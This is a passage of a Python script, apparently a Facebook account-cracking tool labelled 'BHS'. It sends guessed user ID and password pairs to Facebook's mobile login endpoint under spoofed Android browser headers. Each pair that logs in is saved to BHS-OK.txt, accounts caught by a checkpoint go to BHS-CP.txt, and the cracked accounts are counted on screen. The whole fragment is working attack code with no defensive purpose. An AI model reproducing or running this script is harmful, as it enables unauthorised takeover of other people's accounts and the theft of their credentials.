            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
            'method':'GET',
            'scheme':'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'dpr': '1.9250000715255737',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"WAS-LX2J"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"8.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'viewport-width': '980',}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(ids+'|'+ps+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[BHS-OK] '+cid+'|'+ps+'\033[0;97m')
                open('BHS-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[BHS-CP] '+ids+' | '+ps+'\x1b[1;97m')
                open('BHS-CP.txt', 'a').write(ids+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mBHS\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
try:
        menu()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:pass
menu()
